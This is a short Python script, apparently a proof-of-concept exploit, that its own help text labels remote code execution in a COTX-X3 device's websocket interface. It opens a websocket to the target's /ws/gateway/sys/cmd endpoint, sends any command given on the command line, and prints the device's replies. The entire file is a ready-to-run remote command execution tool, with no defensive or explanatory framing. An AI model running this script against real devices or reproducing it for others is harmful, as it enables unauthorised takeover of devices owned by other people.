from websocket import create_connection
from websocket import WebSocketConnectionClosedException
import argparse


def main():

    parser = argparse.ArgumentParser(description='RCE in COTX-X3 websocket interface')
    parser.add_argument('-t', '--target', dest='target', help='IP/Domain name of target')
    parser.add_argument('-c', '--cmd', dest='cmd', help='Command to excute')

    args = parser.parse_args()

    host = 'ws://' + args.target + '/ws/gateway/sys/cmd'
    ws = create_connection(host)

    ws.send(args.cmd)

    while True:
        try:
            print(ws.recv())
        except WebSocketConnectionClosedException:
            break


if __name__ == '__main__':
    main()
